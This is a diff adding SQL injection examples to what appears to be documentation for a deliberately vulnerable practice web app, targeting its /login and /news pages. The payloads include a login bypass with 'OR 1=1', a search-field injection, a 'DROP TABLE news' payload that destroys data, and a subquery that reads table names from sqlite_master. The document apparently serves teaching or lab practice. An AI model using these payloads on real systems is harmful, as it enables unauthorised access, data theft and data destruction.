@@ -22,5 +22,23 @@ Landing page:
 
 ### Example 1
 
+Page: /login
+
 username:  `nesto' OR 1=1; --`
 password: any
+
+### Example 2
+
+Page: /news
+
+Search: `%'; --`
+
+### Example 3
+
+Page: /news
+Add News data: `',''); DROP TABLE news --`
+
+### Example 4
+
+Page: /news
+Add News data: `tajna tabela: ' || (SELECT tbl_name FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%'),'user') --`
